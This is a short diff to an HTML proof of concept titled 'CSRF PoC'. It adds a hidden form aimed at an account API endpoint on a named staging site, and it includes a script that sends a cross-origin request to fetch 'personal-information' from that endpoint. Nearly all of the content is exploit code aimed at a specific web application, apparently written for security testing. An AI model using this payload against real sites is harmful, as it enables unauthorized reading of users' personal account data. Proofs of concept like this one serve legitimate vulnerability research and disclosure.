@@ -2,6 +2,9 @@
 <html>
 <h1>CSRF PoC</h1>
 <body>
+  <form id="csrfForm" action="https://stage.agrev.com/my-account/_jcr_content/root/container/my_account.api.json">
+    <input type="hidden" name="service" value="personal&#45;information" />
+</form>
   <script>
     var xhr = new XMLHttpRequest();
     xhr.open("GET", "https://stage.agrev.com/my-account/_jcr_content/root/container/my_account.api.json", true);
